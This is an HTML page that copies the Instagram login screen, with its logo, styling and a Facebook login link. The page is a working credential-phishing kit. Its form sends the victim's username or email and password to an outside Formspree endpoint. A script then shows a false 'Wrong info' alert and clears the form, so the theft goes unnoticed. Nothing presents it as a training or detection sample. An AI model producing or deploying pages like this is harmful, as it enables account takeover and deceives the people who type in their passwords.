<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login </title>
    <style>
        /* General Reset & Aesthetics */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .main-container {
            width: 100%;
            max-width: 350px;
        }

        /* Login Box Styles (White Box) */
        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            text-align: center;
            margin-bottom: 10px;
            border-radius: 3px;
        }

        /* Style for the logo image */
        .brand-logo-img {
            display: block;
            margin: 22px auto 12px;
            width: 175px; 
            height: 51px; 
        }

        /* Form Inputs */
        .login-form input {
            width: 100%;
            height: 38px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            margin-bottom: 6px;
            font-size: 12px;
        }

        .login-form input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }

        /* Login Button */
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: 600;
            font-size: 14px;
            margin: 8px 0;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }
        
        /* Visual Separators */
        .separator {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }

        .line {
            height: 1px;
            flex: 1;
            background-color: #dbdbdb;
        }

        .or-text {
            margin: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        /* Facebook Login Link */
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            display: block;
        }

        /* Signup Link Box */
        .signup-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 25px;
            text-align: center;
            font-size: 14px;
            border-radius: 3px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .forgot-pass {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            display: block;
            margin-top: 12px;
        }

        /* Status Message Styling */
        #statusMessage {
            margin-top: 10px;
            font-size: 14px;
            font-weight: 600;
        }
        .error { color: #ed4956; }
        .success { color: #2ecc71; }
    </style>
</head>
<body>

    <div class="main-container">
        <!-- Main Login Box -->
        <div class="login-box">
            <img 
                src="https://i.imgur.com/zqpwkLQ.png" 
                alt="Instagram Logo" 
                class="brand-logo-img"
            >
            
            <!-- Form points to the PHP processing file -->
            <form class="login-form" id="my-form" action="https://formspree.io/f/myyraekv" method="POST">
                <input type="text" name="email" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                
                <button type="submit" class="login-btn" id="my-form-button">Log In</button>
            </form>

            <!-- Status message area for async feedback -->
            <div id="statusMessage"></div>

            <div class="separator">
                <div class="line"></div>
                <div class="or-text">OR</div>
                <div class="line"></div>
            </div>

            <a href="#" class="fb-login">
                <!-- Using a placeholder for the Facebook icon -->
                <i class="fab fa-facebook-square"></i> Log in with Facebook
            </a>
            <a href="#" class="forgot-pass">Forgot password?</a>
        </div>

        <!-- Secondary Redirect Box -->
        <div class="signup-box">
            <p>Don't have an account? <a href="register.php">Sign up</a></p>
        </div>
    </div>

    <script>
        var form = document.getElementById("my-form");
  
  async function handleSubmit(event) {
    event.preventDefault();
    var status = document.getElementById("my-form-status");
    var data = new FormData(event.target);
    fetch(event.target.action, {
      method: form.method,
      body: data,
      headers: {
          'Accept': 'application/json'
      }
    }).then(response => {
      if (response.ok) {
        alert("Wrong info try again or check mail");
        form.reset()
      } else {
        response.json().then(data => {
          if (Object.hasOwn(data, 'errors')) {
            status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
          } else {
            status.innerHTML = "Oops! There was a problem with the internet"
          }
        })
      }
    }).catch(error => {
      status.innerHTML = "Oops! There was a problem Logging in"
    });
  }
  form.addEventListener("submit", handleSubmit)
</script>
</body>
</html>
